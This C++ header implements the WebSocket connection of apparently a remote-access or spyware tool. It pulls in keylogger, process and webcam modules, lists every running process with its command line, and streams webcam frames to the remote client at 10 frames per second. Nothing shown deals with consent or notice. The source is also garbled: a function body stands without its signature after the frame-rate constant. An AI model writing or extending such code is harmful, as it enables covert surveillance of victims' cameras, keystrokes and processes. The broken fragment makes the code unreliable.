#ifndef __websocket_connection_h__
#define __websocket_connection_h__

#include <chrono>
#include <iostream>
#include <sstream>
#include <thread>
#include <vector>

#include "net/http.h"
#include "net/receiver.h"
#include "net/sender.h"
#include "net/tcp_socket.h"
#include "util/base64.h"
#include "util/sha1.h"

static const string SECURITY_KEY_RESPONSE_FIELD = "Sec-WebSocket-Key:";
static const string ORIGIN_RESPONSE_FIELD = "Origin:";

class WebSocketConnection {
public:
  static string computeAcceptKey(const string &clientKey);
  explicit WebSocketConnection(int fd)
      : fd_(fd), handshaked_(false), streaming_(false) {
    sender_.setFd(fd);
    receiver_.setFd(fd);
  }
  void run();

private:
  int fd_;
  Sender sender_;
  Receiver receiver_;
  bool handshaked_;
  bool streaming_;
  void performHandshake_();
  std::string getHttpRequest();
  void startFrameStream_();
};

std::string
WebSocketConnection::computeAcceptKey(const std::string &clientKey) {
  static const string GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
  std::string s = clientKey + GUID;

  SHA1 sha;
  sha.input(reinterpret_cast<const unsigned char *>(s.data()), s.size());

  unsigned char digest[20];
  sha.result(digest);

  return base64_encode(digest, 20);
}

#include "api/keylogger.hpp"
#include "api/process.hpp"
#include "api/webcam.hpp"

static constexpr int FRAME_RATE = 10;


  std::ostringstream oss;
  const auto all = Process::get_all();
  for (const auto &p : all) {
    oss << p.pid << "\t" << p.ppid << "\t" << p.name << "\t" << p.cmd << "\n";
  }
  return oss.str();
}

void WebSocketConnection::run() {
	performHandshake_();

	std::cout << "[WebSocket] Handshake done. Starting command loop.\n";
	while (true) {
		std::string msg;
		if (!receiver_.recvText(sender_, msg)) {
			std::cout << "[WebSocket] Client disconnected or error.\n";
			streaming_ = false;
			break;
		}
		std::cout << "[WebSocket] Received: " << msg << "\n";
	}
}

void WebSocketConnection::startFrameStream_() {
  std::cout << "[WebSocket] Starting frame stream at " << FRAME_RATE
            << " FPS\n";

  while (streaming_) {
    auto start = std::chrono::steady_clock::now();

    // Capture and send frame
    // capture_and_send_frame_ws(&sender_);
    int width = 0;
    int height = 0;
    auto frame = capture_webcam_frame(0, width, height);
    sender_.sendBinary(frame);
    // Check for incoming messages (non-blocking)
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(fd_, &readfds);
    struct timeval tv = {0, 10000}; // 10ms timeout

    int select_result = select(fd_ + 1, &readfds, NULL, NULL, &tv);
    if (select_result > 0) {
      std::string msg;
      if (!receiver_.recvText(sender_, msg)) {
        streaming_ = false; // Client disconnected
        break;
      }
      if (msg == "stop_stream") {
        streaming_ = false;
        sender_.sendText("Stream stopped");
        break;
      }
    }

    // Maintain frame rate
    auto end = std::chrono::steady_clock::now();
    auto elapsed =
        std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    int sleep_ms = (1000 / FRAME_RATE) - elapsed.count();
    if (sleep_ms > 0) {
      std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
    }
  }

  std::cout << "[WebSocket] Frame stream stopped\n";
}

void WebSocketConnection::performHandshake_() {
  HttpRequestParser parser(getHttpRequest());

  string browserSecurityKey = parser[SECURITY_KEY_RESPONSE_FIELD];
  string origin = parser[ORIGIN_RESPONSE_FIELD];
  string acceptValue = computeAcceptKey(browserSecurityKey);

  sender_.sendHandshake(acceptValue);
  handshaked_ = parser.getRequestLine().isCorrectWebsocketUpgradeRequest();
}

string WebSocketConnection::getHttpRequest() {
  string data;
  char buf[1024];
  while (data.find("\r\n\r\n") == std::string::npos) {
    ssize_t n = ::recv(fd_, buf, sizeof(buf), 0);
    if (n <= 0) {
      throw std::runtime_error("Client closed before handshake");
    }
    data.append(buf, buf + n);
  }
  std::cout << data << '\n';
  return data;
}

#endif
